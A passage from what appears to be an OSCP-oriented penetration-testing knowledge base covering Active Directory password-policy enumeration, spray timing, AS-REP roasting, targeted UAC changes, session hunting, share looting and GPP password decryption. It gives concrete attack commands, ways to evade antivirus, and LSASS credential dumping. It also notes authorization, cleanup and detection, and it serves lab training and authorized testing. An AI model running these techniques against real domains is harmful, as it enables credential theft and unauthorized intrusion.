ESTIMATE: 5-10 seconds plus manual conversion time."", ""why_this_works"": ""Password policy is stored in the domain root object in Active Directory LDAP database. The object DN is DC=corp,DC=com (domain root). It contains password policy attributes readable by any authenticated user. ldapsearch with -s base scope queries single object (domain root) with filter (objectClass=*) matching all, then retrieves specified attributes. TIME CONVERSION MATH: Windows stores time in 100-nanosecond intervals since Jan 1, 1601 (FILETIME). Negative values for lockout settings indicate duration FROM current time. Conversion formula: nanoseconds \u00f7 10,000,000 = seconds, seconds \u00f7 60 = minutes. Example: 18000000000 \u00f7 10000000 = 1800 seconds \u00f7 60 = 30 minutes. WHEN TO USE: (1) Need exact numerical values for scripting. (2) SMB-based tools are failing. (3) Want additional attributes (password age policies). (4) Learning LDAP for advanced enumeration. OSCP REALITY: Rarely needed - CrackMapExec provides policy in readable format. Use ldapsearch when you want to practice LDAP or troubleshoot SMB failures.""}]","[{""title"": ""Quick Reference: Lockout Threshold Interpretation"", ""notes"": ""LOCKOUT THRESHOLD is the number that determines safe spray limits. COMMON VALUES: 0 = no lockout (unlimited attempts, extremely rare). 3 = very strict (max 2 safe attempts). 5 = common default (max 4 safe attempts). 10 = lenient (max 9 safe attempts). SAFE ATTEMPT CALCULATION: Always use (threshold - 1) to leave safety margin. Why subtract 1? Users might fail login attempts themselves, consuming lockout counter. If threshold is 5 and you use 5 attempts, a single user mistype locks the account. Using threshold - 1 provides safety buffer. OSCP STRATEGY: With threshold 5, spray maximum 3-4 passwords per observation window for absolute safety."", ""commands"": []}, {""title"": ""Quick Reference: Observation Window Timing"", ""notes"": ""OBSERVATION WINDOW is the time period for counting failed attempts. CRITICAL UNDERSTANDING: Failed attempt counter RESETS after observation window expires from LAST failed attempt (not first). EXAMPLE TIMELINE: User fails login at 10:00am (counter=1). User fails again at 10:10am (counter=2). Observation window is 30min. Counter resets at 10:40am (30min after LAST failure at 10:10am, not 30min after first at 10:00am). You can safely spray again at 10:41am. COMMON VALUES: 15 minutes = wait 16min between spray rounds. 30 minutes = wait 31min between spray rounds. 60 minutes = wait 61min between spray rounds. AUTOMATION: Use sleep command between rounds: spray_passwords.sh; sleep 1860 (31 minutes); spray_passwords.sh. OSCP TIP: Set timer on your phone when starting spray round. When timer expires (observation window + 1min), safe to spray next password."", ""commands"": []}, {""title"": ""Quick Reference: Lockout Duration vs Observation Window"", ""notes"": ""LOCKOUT DURATION = how long account STAYS locked after threshold reached. OBSERVATION WINDOW = how long to wait between spray rounds to reset counter. THESE ARE DIFFERENT CONCEPTS: LOCKOUT DURATION only matters AFTER you've locked an account (threshold exceeded). OBSERVATION WINDOW is what you use to calculate safe spray timing (prevents lockout). EXAMPLE: Threshold 5, Observation window 30min, Lockout duration 60min. SAFE BEHAVIOR: Spray 4 attempts, wait 30min (observation window), spray 4 more, repeat = never lock accounts. LOCKED ACCOUNT: If you exceed 5 attempts within 30min window, account locks for 60min. COMMON CONFUSION: Admins sometimes set lockout duration = observation window (both 30min) or lockout duration longer (60min). Always use OBSERVATION WINDOW for spray timing calculations, not lockout duration. OSCP SCENARIO: If you accidentally lock an account, you must wait lockout duration (30min-60min typically) before that account is usable again. This wastes exam time and may alert administrators."", ""commands"": []}, {""title"": ""Tool Selection Guide: Which Method to Use When"", ""notes"": ""DECISION TREE FOR POLICY DISCOVERY: [1] Do you have Windows access (RDP/WinRM/shell)? \u2192 YES: Use net-accounts-policy (fastest, most reliable, <5 seconds). NO: Continue to [2]. [2] Are you on Linux/Mac? \u2192 YES: Continue to [3]. [3] Do you have ANY valid credentials (even guest account)? \u2192 YES: Use crackmapexec-policy (modern, reliable, works with SMBv2/v3). NO: Try enum4linux-policy (null session attempt). [4] Did enum4linux fail with ACCESS_DENIED? \u2192 YES: You MUST obtain credentials first. Try: password spraying with common defaults, OSINT for credentials, guest account (try -u guest -p ''). ADVANCED CASE: Need detailed LDAP attributes or SMB is blocked but LDAP works? \u2192 Use ldapsearch-policy. TIME COMPARISON: net accounts (Windows): <5 sec. CrackMapExec (Linux+creds): 5-15 sec. enum4linux (Linux+null): 10-30 sec. ldapsearch (Linux+creds): 5-10 sec (+conversion time). RELIABILITY RANKING: net accounts (99%) > CrackMapExec (95%) > ldapsearch (90%) > enum4linux null session (20% success on modern domains). OSCP RECOMMENDATION: Always prioritize net accounts if you have Windows access. Use CrackMapExec as fallback from Linux with credentials."", ""commands"": [{""id"": ""net-accounts-policy"", ""example"": ""net accounts"", ""shows"": ""Force user logoff how long after time expires?""}, {""id"": ""crackmapexec-policy"", ""example"": ""crackmapexec smb 192.168.50.70 -u guest -p '' --pass-pol"", ""shows"": ""[+] Dumping password policy""}, {""id"": ""enum4linux-policy"", ""example"": ""enum4linux -P 192.168.50.70"", ""shows"": ""Password Complexity""}, {""id"": ""ldapsearch-policy"", ""example"": ""ldapsearch -x -H ldap://192.168.50.70 -b 'DC=corp,DC=com' -s base '(objectClass=*)' lockoutThreshold lockoutDuration lockOutObservationWindow minPwdLength pwdProperties"", ""shows"": ""lockoutThreshold:""}]}]"
"ad-asreproast-methodology","Active Directory AS-REP Roasting Methodology","Complete methodology for AS-REP Roasting attacks against Active Directory - exploiting users with 'Do not require Kerberos preauthentication' enabled to extract offline-crackable hashes","ACTIVE_DIRECTORY|AS-REP_ROASTING|KERBEROS|METHODOLOGY|OSCP:HIGH|WORKFLOW","{""how_to_recognize"": [""You have valid domain user credentials OR network access to domain controller"", ""You're looking for credential access attacks that don't require privileged access"", ""You want to extract offline-crackable password hashes from AD"", ""You've identified users with 'Do not require Kerberos preauthentication' enabled""], ""when_to_look_for"": [""During initial domain enumeration after obtaining valid credentials"", ""When password spraying doesn't find weak passwords (AS-REP may reveal different accounts)"", ""After gaining access to domain-joined Windows system (Rubeus doesn't need explicit credentials)"", ""OSCP exam: Quick win attack - takes <5 seconds to identify vulnerable users, 1-60 minutes to crack""]}","[{""title"": ""Scenario 1: External AS-REP Roasting from Linux (With Credentials)"", ""context"": ""You're on a Kali Linux attack box with network access to domain controller at 192.168.50.70 (domain: corp.com). You've obtained valid domain credentials (pete:Nexus123!) via password spraying. You want to check if any users have Kerberos preauthentication disabled and extract their password hashes for offline cracking."", ""approach"": ""Use impacket-GetNPUsers to enumerate and extract AS-REP hashes. This is the standard Linux-based AS-REP roasting method. First identify vulnerable users, then request AS-REP hashes in Hashcat-compatible format. Crack hashes with Hashcat mode 18200."", ""commands"": [""impacket-getnpusers-identify"", ""impacket-getnpusers-asreproast"", ""hashcat-crack-asrep"", ""crackmapexec-validate-admin""], ""expected_outcome"": ""impacket-GetNPUsers without -request flag lists vulnerable users: dave (standard user, no admin groups). With -request flag, extracts AS-REP hash: $krb5asrep$23$dave@CORP.COM:b24a619cfa585dc1... saved to hashes.asreproast. Hashcat mode 18200 with rockyou.txt and best64.rule cracks hash in 15 minutes: dave:Flowers1. Validate with crackmapexec to check admin rights. TIME ESTIMATE: Enumeration (5 sec) + hash extraction (5 sec) + cracking (1-60 min depending on password)."", ""why_this_works"": ""KERBEROS PREAUTHENTICATION normally prevents offline attacks by requiring encrypted timestamp from client BEFORE issuing AS-REP. If preauthentication is DISABLED (DONT_REQ_PREAUTH UAC flag), the KDC will issue AS-REP to anyone who requests it for that user - no password needed. The AS-REP contains encrypted data (enc-part) using the user's password hash as the encryption key. We can request this AS-REP and brute-force the encryption key offline. DEFAULT SETTING: Preauthentication is ENABLED by default (secure). Accounts with preauthentication disabled are RARE - usually required for: (1) Legacy applications (old Kerberos implementations). (2) Service accounts with specific compatibility requirements. (3) Misconfigurations. ATTACK REQUIREMENTS: Valid domain credentials (any user) for authenticated LDAP query OR username wordlist for unauthenticated enumeration (-usersfile flag, less common). HASH FORMAT: $krb5asrep$23$ = Kerberos 5 AS-REP etype 23 (RC4-HMAC). Hashcat mode 18200. TIME SYNC: Kerberos requires <5 minute clock difference. Use ntpdate or rdate if KRB_AP_ERR_SKEW errors occur.""}, {""title"": ""Scenario 2: Internal AS-REP Roasting from Windows (Domain-Joined System)"", ""context"": ""You've gained RDP access to a Windows 10 workstation CLIENT75 as domain user corp\\jeff (password: HenchmanPutridBonbon11). The system is domain-joined to corp.com. You want to perform AS-REP roasting without needing to enter credentials manually (use existing session). Rubeus.exe is available in C:\\Tools\\."", ""approach"": ""Use Rubeus asreproast from the domain-joined Windows system. Rubeus will automatically use your current domain user context (no credentials needed), enumerate all users with preauthentication disabled, and extract AS-REP hashes in Hashcat-compatible format. Transfer hashes to Kali for cracking."", ""commands"": [""rubeus-asreproast"", ""hashcat-crack-asrep""], ""expected_outcome"": ""Rubeus.exe asreproast /nowrap identifies dave with preauthentication disabled. Output shows: SamAccountName: dave, DistinguishedName: CN=dave,CN=Users,DC=corp,DC=com, ServicePrincipalName: (none), PwdLastSet: 9/7/2022 5:21:17 AM. AS-REP hash displayed (single line due to /nowrap): $krb5asrep$dave@corp.com:AE43CA9011CC7E7B.... Copy hash to Kali, save as hashes.asreproast2, crack with Hashcat mode 18200: dave:Flowers1. TIME ESTIMATE: Hash extraction (5-10 sec) + transfer to Kali (30 sec) + cracking (1-60 min)."", ""why_this_works"": ""RUBEUS ADVANTAGES: (1) No credentials needed - uses current user's Kerberos session. (2) Faster than impacket (native Windows Kerberos API). (3) No time sync issues. (4) Auto-discovers domain context. /nowrap FLAG CRITICAL: Without /nowrap, hash output spans multiple lines with line breaks. Hashcat requires SINGLE-LINE format. /nowrap prevents newlines in hash string. TOOL LOCATION: Rubeus.exe typically in C:\\Tools\\ on OSCP lab systems. Download: https://github.com/GhostPack/Rubeus. EXECUTION CONTEXT: Must run from domain-joined system OR use runas /netonly /user:DOMAIN\\username cmd.exe to inject credentials. AV EVASION: Rubeus is flagged by Windows Defender. Options: (1) Disable AV (Add-MpPreference -ExclusionPath C:\\Tools). (2) Obfuscated Rubeus build. (3) Reflectively load in memory (Invoke-Rubeus). (4) Fall back to impacket-GetNPUsers from Linux. HASH OUTPUT FORMAT: Default is Hashcat mode 18200 compatible. Can specify /format:john for John the Ripper format.""}, {""title"": ""Scenario 3: Identifying Vulnerable Users Without Extracting Hashes"", ""context"": ""You're performing reconnaissance and want to identify which users are vulnerable to AS-REP roasting WITHOUT extracting hashes yet. You have domain credentials (pete:Nexus123!) and want to understand the attack surface before committing to hash extraction. You want to identify high-value targets (admin accounts, old passwords) for prioritized attacks."", ""approach"": ""Use impacket-GetNPUsers or PowerView to enumerate users with preauthentication disabled. Analyze output for: (1) Group membership (Domain Admins, Enterprise Admins). (2) Password age (PasswordLastSet). (3) Last logon (active vs stale accounts). Prioritize high-value targets before extracting hashes."", ""commands"": [""impacket-getnpusers-identify"", ""powerview-asreproast-identify""], ""expected_outcome"": ""IMPACKET OUTPUT: Name: dave, MemberOf: CN=Users,DC=corp,DC=com (standard user, no privileged groups), PasswordLastSet: 2022-09-02 19:21:17 (password 5 days old), LastLogon: 2022-09-07 12:45:15 (active account). UAC: 0x410200 (DONT_REQ_PREAUTH flag set). POWERVIEW OUTPUT: samaccountname: dave, memberof: CN=Users,DC=corp,DC=com, pwdlastset: 133069404... (convert to date). ANALYSIS: (1) No privileged groups = standard user (still valuable for lateral movement). (2) Recent password change = might be strong (but worth trying). (3) Active account = credentials will be useful. DECISION: Extract hash and attempt crack - even standard user provides domain enumeration and potential lateral movement. TIME ESTIMATE: <5 seconds for enumeration."", ""why_this_works"": ""ENUMERATION-ONLY approach allows: (1) Reconnaissance without committing to attack. (2) Target prioritization (attack admin accounts first). (3) Understanding attack surface (10 vulnerable users vs 1). (4) Avoiding detection (enumeration is quieter than hash extraction). UAC FLAG: 0x410200 = 4194816 decimal = DONT_REQ_PREAUTH (0x400000) + other flags. Check with: (Get-DomainUser dave -Properties useraccountcontrol).useraccountcontrol -band 4194304 (returns 4194304 if flag set). PASSWORD AGE ANALYSIS: Old PasswordLastSet dates (>1 year) indicate weak password likely. Users rarely change passwords - password from 2019 might still be 'Summer2019!' or 'Password1!'. GROUP MEMBERSHIP: Look for 'Domain Admins', 'Enterprise Admins', 'Backup Operators', 'Account Operators' (privileged groups). Standard users can still pivot to admin via cached credentials on workstations. STALE ACCOUNTS: LastLogon very old (>6 months) = account might be disabled or unused. Focus on active accounts first.""}, {""title"": ""Scenario 4: Targeted AS-REP Roasting with GenericWrite Permissions"", ""context"": ""You're performing an AD assessment and have identified that user corp\\jeff has GenericWrite permissions on user corp\\targetuser. No users currently have preauthentication disabled. You want to perform TARGETED AS-REP roasting: temporarily enable DONT_REQ_PREAUTH on targetuser, extract hash, crack password, then reset UAC to original value."", ""approach"": ""Use PowerView Set-DomainObject to modify targetuser's userAccountControl attribute, adding the DONT_REQ_PREAUTH flag (4194304). Extract AS-REP hash with Rubeus or impacket. Crack hash offline. CRITICAL: Reset UAC after obtaining hash to avoid leaving account vulnerable. Document all changes for assessment report."", ""commands"": [""targeted-asreproast-set"", ""rubeus-asreproast"", ""impacket-getnpusers-asreproast"", ""hashcat-crack-asrep"", ""targeted-asreproast-cleanup""], ""expected_outcome"": ""PERMISSION VERIFICATION: Get-DomainObjectAcl -Identity targetuser -ResolveGUIDs shows jeff has GenericWrite. ENABLE PREAUTH BYPASS: Set-DomainObject -Identity targetuser -XOR @{useraccountcontrol=4194304} succeeds. Verification: (Get-DomainUser targetuser -Properties useraccountcontrol).useraccountcontrol shows 4194816 (DONT_REQ_PREAUTH enabled). EXTRACT HASH: Rubeus asreproast finds targetuser, extracts hash. CRACK: Hashcat mode 18200 cracks hash: targetuser:CompanyPassword123!. CLEANUP: Set-DomainObject -Identity targetuser -XOR @{useraccountcontrol=4194304} resets UAC. Verification shows UAC back to 512 (normal). TIME ESTIMATE: Set flag (5 sec) + extract hash (10 sec) + crack (1-60 min) + cleanup (5 sec)."", ""why_this_works"": ""TARGETED ATTACK for scenarios where NO users have preauthentication disabled by default. PERMISSION REQUIREMENTS: GenericWrite OR GenericAll on target user account. These permissions allow modifying user attributes including userAccountControl. UAC XOR OPERATION: Using -XOR with 4194304 (0x400000 = DONT_REQ_PREAUTH bit) TOGGLES the flag without affecting other UAC bits. First XOR enables flag, second XOR disables it (reversible). Safer than -Set which overwrites entire UAC value. COMMON PERMISSION SCENARIOS: (1) Service account management (IT has write permissions on service accounts). (2) Delegated administration (help desk can modify specific user OUs). (3) ACL misconfigurations (GenericAll on Users OU). (4) Group-based permissions (member of 'Account Operators' group). ETHICAL CONSIDERATIONS: This MODIFIES production AD. Impact: (1) Temporarily weakens account security. (2) Creates audit trail (Event ID 4738 - user account changed). (3) Can alert security monitoring. ALWAYS: (1) Get written authorization. (2) Document changes. (3) Reset UAC immediately after hash extraction. (4) Include in assessment report with before/after UAC values. DETECTION: Event ID 4738 shows userAccountControl modification. DONT_REQ_PREAUTH on standard user account is HIGHLY SUSPICIOUS. Blue team should alert on UAC changes to 4194816.""}, {""title"": ""Scenario 5: Time Synchronization Troubleshooting (KRB_AP_ERR_SKEW)"", ""context"": ""You're attempting AS-REP roasting from Kali Linux against corp.com domain controller (192.168.50.70). You receive error: 'Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)'. Your attack is blocked due to time synchronization issues. You need to sync your Kali system time with the domain controller to successfully perform AS-REP roasting."", ""approach"": ""Synchronize Kali system time with domain controller using ntpdate or rdate. Kerberos requires <5 minute time difference between client and KDC. After sync, retry AS-REP roasting with impacket-GetNPUsers. Verify time sync before long-running attacks to avoid mid-attack failures."", ""commands"": [], ""expected_outcome"": ""BEFORE SYNC: date shows Kali time: 14:30:00 UTC. DC time (estimated via NTP): 14:42:00 UTC (12 minute difference). Error: KRB_AP_ERR_SKEW. SYNC WITH NTPDATE: sudo ntpdate 192.168.50.70 shows: 7 Sep 14:42:03 ntpdate[12345]: adjust time server 192.168.50.70 offset 0.720003 sec. Kali time now matches DC. VERIFICATION: date shows 14:42:05 UTC (within 5 seconds of DC). RETRY ATTACK: impacket-GetNPUsers -dc-ip 192.168.50.70 -request -outputfile hashes.asreproast corp.com/pete now succeeds. Hash extracted successfully. TIME ESTIMATE: 5-10 seconds for time sync + retry attack."", ""why_this_works"": ""KERBEROS TIME REQUIREMENT: Kerberos authentication requires client and KDC (domain controller) clocks to be within 5 minutes by default (configurable via MaxClockSkew policy). WHY: Prevents replay attacks - Kerberos tickets have timestamps. If clocks are misaligned, timestamp validation fails. ERROR KRB_AP_ERR_SKEW: Kerberos error code indicating time difference exceeds MaxClockSkew policy. Common in VM environments (clock drift), cross-timezone attacks, or systems without NTP configured. NTPDATE vs RDATE: (1) ntpdate: Uses NTP protocol (port 123/UDP). More accurate, gradual adjustment. Syntax: sudo ntpdate <DC_IP>. May require: sudo apt install ntpdate. (2) rdate: Uses Time protocol (port 37/TCP). Simple, immediate set. Syntax: sudo rdate -n <DC_IP>. Legacy protocol, may be blocked by firewall. OSCP TIP: Try ntpdate first. If port 123 blocked, try rdate. If both fail, manually set time: sudo date -s 'YYYY-MM-DD HH:MM:SS'. AUTOMATION: Add time sync to attack script: sudo ntpdate $DC_IP 2>/dev/null || sudo rdate -n $DC_IP 2>/dev/null || echo 'Manual time sync required'. VERIFICATION: Compare Kali time (date) with DC time. Windows DC: net time \\\\DC_IP shows DC time. PERSISTENT SYNC: For long engagements, configure NTP: echo 'server <DC_IP> iburst' | sudo tee -a /etc/ntp.conf; sudo systemctl restart ntp.""}]","[{""title"": ""Understanding AS-REP Roasting vs Password Spraying"", ""notes"": ""AS-REP ROASTING and PASSWORD SPRAYING are complementary attacks with different requirements and targets. PASSWORD SPRAYING: Tests ONE password against MANY users. Requires: Domain access OR Kerberos port 88. Targets: All users (looking for weak passwords). Risk: Account lockout if threshold exceeded. Success rate: 10-30% (common weak passwords). AS-REP ROASTING: Extracts hashes from users with SPECIFIC misconfiguration. Requires: Valid credentials OR username list. Targets: Only users with DONT_REQ_PREAUTH enabled (rare - often <5% of users). Risk: None - no lockout mechanism. Success rate: High IF vulnerable users exist (hash cracking depends on password strength). RECOMMENDATION: Run BOTH attacks. Password spraying finds weak passwords across all users. AS-REP roasting finds ANY password (weak or strong) on misconfigured accounts. Different attack surfaces - one may succeed where other fails. TIME ESTIMATE: Password spray (5-10 min including policy check and spraying). AS-REP roast (30 sec enumeration + 1-60 min cracking). DETECTION: Password spraying generates Event ID 4625 (failed logons) - noisy if lockout threshold reached. AS-REP roasting generates Event ID 4768 (TGT request) - normal Kerberos traffic, stealthy."", ""commands"": [{""id"": ""impacket-getnpusers-identify"", ""example"": ""impacket-GetNPUsers -dc-ip 192.168.50.70 corp.com/pete"", ""shows"": ""Name""}, {""id"": ""kerbrute-passwordspray"", ""example"": ""kerbrute passwordspray -d corp.com --dc 192.168.50.70 valid_users.txt 'Nexus123!'"", ""shows"": ""[+] VALID LOGIN:""}]}, {""title"": ""Default AD Security Posture - Why AS-REP Roasting is Rare"", ""notes"": ""KERBEROS PREAUTHENTICATION is ENABLED BY DEFAULT in Active Directory. This is the SECURE configuration. User account creation via ADUC (Active Directory Users and Computers) or New-ADUser cmdlet does NOT set DONT_REQ_PREAUTH flag. WHY PREAUTHENTICATION EXISTS: Prevents offline brute-force attacks. Without preauth, anyone could request AS-REP for any user and crack offline. With preauth, client must prove knowledge of password (encrypted timestamp) BEFORE receiving AS-REP. WHEN PREAUTHENTICATION IS DISABLED: (1) LEGACY APPLICATIONS: Old Kerberos implementations (pre-Windows 2000) that don't support preauthentication. Rare in modern environments. (2) THIRD-PARTY SERVICES: Some vendors require preauthentication disabled for compatibility (poorly designed software). (3) SERVICE ACCOUNTS: Misguided attempt to 'simplify' service account configuration. (4) MISCONFIGURATIONS: Accidental checkbox in ADUC or incorrect GPO setting. STATISTICS: In typical corporate domain: 90-99% of users have preauthentication enabled (default). 1-10% might have it disabled (legacy/service accounts). 0% is common in well-configured environments. OSCP EXPECTATION: AS-REP roasting may find 0-2 vulnerable accounts per domain. This is NORMAL - don't assume it will always succeed. Worth checking (takes <30 seconds) but not guaranteed. BLUE TEAM DEFENSE: Monitor Event ID 4738 (user account changes) for userAccountControl modifications to 4194816. Audit users with DONT_REQ_PREAUTH enabled quarterly. Enable preauthentication unless PROVEN incompatibility with specific legacy application."", ""commands"": []}, {""title"": ""Hash Cracking Strategy - Hashcat Mode 18200 Optimization"", ""notes"": ""AS-REP HASH FORMAT: $krb5asrep$23$user@DOMAIN.COM:hash_data = Kerberos 5 AS-REP etype 23 (RC4-HMAC). HASHCAT MODE: 18200 (Kerberos 5, etype 23, AS-REP). VERIFICATION: hashcat --help | grep -i 'Kerberos' shows mode 18200 for AS-REP. CRACKING STRATEGY: (1) STRAIGHT DICTIONARY: hashcat -m 18200 hashes.asreproast rockyou.txt --force (fast, try first). (2) RULE-BASED: hashcat -m 18200 hashes.asreproast rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force (adds complexity - Password \u2192 Password1, Password!, etc.). (3) TARGETED WORDLIST: If you know username or organization, create custom wordlist: username (dave \u2192 dave, Dave, DAVE), organization (corp \u2192 corp2023!, Corp123!), common patterns (Password1!, Welcome2023!). PERFORMANCE: RC4-HMAC (etype 23) is FAST to crack on GPU. Hash rate: ~500 MH/s on RTX 3080 (500 million hashes/second). Rockyou.txt (14M passwords) = <1 second straight dictionary. With best64.rule (77 rules) = 1-2 minutes. OSCP VM NOTE: Hashcat in Kali VM without GPU uses CPU - MUCH slower (~500 KH/s vs 500 MH/s). Add --force flag to suppress warnings. Consider cracking on physical machine with GPU for 1000x speed improvement. RULE FILE SELECTION: best64.rule (fast, 77 rules - 1-2 min), rockyou-30000.rule (thorough, 30000 rules - 30-60 min), dive.rule (comprehensive, 100K+ rules - hours). TIME ESTIMATE: Weak password (dictionary word + number) = 1-5 min with rules. Strong password (random 12+ chars) = infeasible. MONITORING: hashcat --status shows progress. Press 's' key for instant status update."", ""commands"": [{""id"": ""hashcat-crack-asrep"", ""example"": ""hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force"", ""shows"": ""Cracked""}]}, {""title"": ""Cleanup and Remediation After Targeted AS-REP Roasting"", ""notes"": ""TARGETED AS-REP ROASTING modifies production AD (sets DONT_REQ_PREAUTH flag). CLEANUP IS MANDATORY. IMMEDIATE CLEANUP: After extracting hash and BEFORE starting crack, reset UAC flag: Set-DomainObject -Identity <USERNAME> -XOR @{useraccountcontrol=4194304} -Verbose. Same command that enabled flag also disables (XOR is reversible). VERIFICATION: Get-DomainUser -Identity <USERNAME> -Properties useraccountcontrol. Normal UAC values: 512 (enabled account), 544 (password not required, disabled preauthentication - legacy), 66048 (disabled account). Values with +4194304 indicate DONT_REQ_PREAUTH still enabled (CLEANUP FAILED). AUTOMATION: Create cleanup script with timer: Start-Sleep -Seconds 1800; Set-DomainObject -Identity targetuser -XOR @{useraccountcontrol=4194304}. Sets 30-minute reminder for manual cleanup. ASSESSMENT REPORTING: Document in report: (1) User account modified (targetuser). (2) Modification type (DONT_REQ_PREAUTH enabled temporarily). (3) Duration (enabled from 14:30 to 14:35 - 5 minutes). (4) Cleanup verification (UAC reset to 512 confirmed). (5) Before/after screenshots (Get-DomainUser output). FAILED CLEANUP SCENARIO: If you lose access before cleanup (session dropped, RDP disconnected, network issue): (1) Document in report immediately. (2) Notify client ASAP. (3) Provide manual cleanup steps: ADUC \u2192 Find user \u2192 Properties \u2192 Account tab \u2192 Uncheck 'Do not require Kerberos preauthentication' \u2192 OK. (4) Follow up to confirm client completed cleanup. ETHICS: Leaving account with DONT_REQ_PREAUTH enabled = unprofessional and potentially violates engagement terms. Pentest certifications (OSCP, OSWE) emphasize proper cleanup. CLIENT COMMUNICATION: If cleanup fails, email client: 'During assessment, user [username] had temporary AD modification (DONT_REQ_PREAUTH flag). Please verify flag has been reset using provided steps. Apologize for inconvenience.'"", ""commands"": [{""id"": ""targeted-asreproast-cleanup"", ""example"": ""Set-DomainObject -Identity targetuser -XOR @{useraccountcontrol=4194304} -Verbose"", ""shows"": ""useraccountcontrol set""}]}]"
"ad-lateral-movement-prep","Active Directory Lateral Movement Preparation","Enumerate active sessions, logged-on users, accessible shares, and admin access paths to identify lateral movement opportunities and target high-value accounts","ACTIVE_DIRECTORY|LATERAL_MOVEMENT|SESSION_ENUMERATION|SHARES|GPP|CREDENTIAL_HARVESTING|OSCP:HIGH","{""how_to_recognize"": [""You have domain user credentials and need to move laterally to other machines"", ""Looking for paths to privileged accounts (where are Domain Admins logged in?)"", ""Need to identify which machines you already have admin access on"", ""Searching for sensitive data in network shares (credentials, configuration files)""], ""when_to_look_for"": [""After initial domain reconnaissance completes"", ""When you have credentials but need to find where to use them effectively"", ""Before attempting PsExec/WinRM/RDP lateral movement (verify admin access first)"", ""OSCP exam: Always enumerate shares and sessions - credentials often found in SYSVOL/NETLOGON""]}","[{""title"": ""Scenario 1: Find Where Domain Admins Are Logged In"", ""context"": ""You compromised 'corp\\helpdesk' account. You need to escalate to Domain Admin. Rather than cracking passwords or exploiting ACLs, you want to find where Domain Admin accounts have active sessions - if you can compromise that machine, you can dump credentials from memory (Mimikatz). This is the hunter-gatherer approach."", ""approach"": ""Use Get-NetSession (PowerView) to enumerate active SMB sessions on all domain computers. Cross-reference session users against Domain Admins group members. This reveals which machines currently have Domain Admin accounts logged in. Target those machines for exploitation (vulnerability, credential reuse, etc.)."", ""commands"": [""powerview-get-netsession"", ""powerview-get-netloggedon"", ""net-group-domain-admins""], ""expected_outcome"": ""Get-NetSession iterates through all domain computers (250+ in large env), queries NetSessionEnum API on each, returns active sessions. Output: 'UserName: DA-ADMIN, ComputerName: WS01.corp.com'. Cross-check 'DA-ADMIN' against Domain Admins members (net group 'Domain Admins' /domain). WS01 now becomes your target - compromise WS01 and dump DA-ADMIN's credentials from LSASS memory."", ""why_this_works"": ""NetSessionEnum API (exposed via SMB) returns active network sessions on a remote computer. When users access file shares, map drives, or use certain tools (PsExec, etc.), their username is logged in the session table. This API is intended for admins to see who's accessing resources but becomes recon gold for attackers. NOTE: Modern Windows (Server 2019+, Windows 11+) restricts NetSessionEnum to admins. On older systems (Server 2016-, Windows 10-), any authenticated user can call it.""}, {""title"": ""Scenario 2: Enumerate Local Admin Access (Where Can I Already Go?)"", ""context"": ""You have 'corp\\backupuser' credentials. Before attempting complex exploits, you want to know: which machines do I already have local admin access on? Backupuser might have delegated admin rights on backup servers, file servers, etc. This is free lateral movement - no exploit needed."", ""approach"": ""Use Find-LocalAdminAccess (PowerView) or Test-AdminAccess (manual). PowerView automates testing SMB admin shares (C$, ADMIN$) on all domain computers. Any machine where you can access C$ = you have local admin rights. These machines are lateral movement targets."", ""commands"": [""powerview-find-localadminaccess""], ""expected_outcome"": ""Find-LocalAdminAccess queries all domain computers (Get-NetComputer), attempts to access \\\\COMPUTER\\C$ on each. Output: 'FILESERVER01.corp.com', 'BACKUP-SRV.corp.com'. You have local admin on these machines without any exploitation. Use PsExec, WinRM, or RDP to authenticate and gain interactive access. From there, dump credentials, search for sensitive data, pivot to other systems."", ""why_this_works"": ""Windows administrative shares (C$, ADMIN$) are only accessible to local administrators. By testing access to C$ on each computer, you're effectively testing local admin rights. This works because: (1) Domain accounts can be members of local Administrators group via GPO or manual addition, (2) Certain privileged domain groups (Domain Admins, backup operators, etc.) have implicit local admin on all domain computers. You're not exploiting anything - just discovering where you already have access.""}, {""title"": ""Scenario 3: Share Enumeration for Credential Harvesting"", ""context"": ""You're 'corp\\lowpriv' and need privilege escalation. Standard attacks (Kerberoasting, ACLs) yielded nothing. Time to search network shares for credentials. Focus on: SYSVOL (GPP passwords), NETLOGON (scripts with hardcoded creds), user home directories (SSH keys, .rdp files, KeePass databases), application shares (web.config, appsettings.json)."", ""approach"": ""Use Find-DomainShare (PowerView) or manual 'net view \\\\COMPUTER' to discover all SMB shares. Prioritize readable shares (exclude ADMIN$, C$ which require admin). Search for sensitive file types: .xml (GPP), .ps1 (scripts), .config (app configs), .txt (notes), .rdp (saved RDP credentials), .kdbx (KeePass). This is tedious but OSCP-relevant - credentials often found in shares."", ""commands"": [""powerview-find-domainshare"", ""powerview-find-domainshare-exclude""], ""expected_outcome"": ""Find-DomainShare returns 50+ shares: SYSVOL, NETLOGON, Users, IT-Tools, Backups, etc. Mount accessible shares (net use Z: \\\\DC01\\SYSVOL) and search. Common findings: SYSVOL\\Policies\\{GUID}\\Machine\\Preferences\\Groups\\Groups.xml (GPP password, decrypt with gpp-decrypt), NETLOGON\\login.ps1 (hardcoded service account creds), Users\\jsmith\\.ssh\\id_rsa (SSH private key). One credential finding can unlock entire domain."", ""why_this_works"": ""Network shares are designed for data sharing but often contain sensitive information. SYSVOL is replicated to all DCs and readable by all authenticated users (requirement for GPO processing). NETLOGON hosts login scripts that run on user logon (often contain creds for mapped drives). User shares contain personal files (SSH keys, .rdp files with saved creds). This isn't an exploit - it's intended functionality being abused for credential harvesting.""}, {""title"": ""Scenario 4: GPP Password Decryption (Groups.xml)"", ""context"": ""During share enumeration, you found 'SYSVOL\\corp.com\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\Machine\\Preferences\\Groups\\Groups.xml' containing: <Properties ... cpassword='edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ' ... />. This is a GPP (Group Policy Preference) password - decrypt it for credentials."", ""approach"": ""GPP passwords are AES-256 encrypted using a published Microsoft key (disclosed in MS14-025). Use gpp-decrypt (Kali tool) or PowerShell (ConvertFrom-SecureString) to decrypt. The 'cpassword' attribute contains the AES-encrypted password. Common use case: GPP used to set local administrator password on workstations - decrypting gives you local admin everywhere."", ""commands"": [""gpp-password-decrypt""], ""expected_outcome"": ""gpp-decrypt 'edBSHO...' returns plaintext password: 'P@ssw0rd123'. Check the Groups.xml file context - it likely sets the local administrator password on all domain workstations. 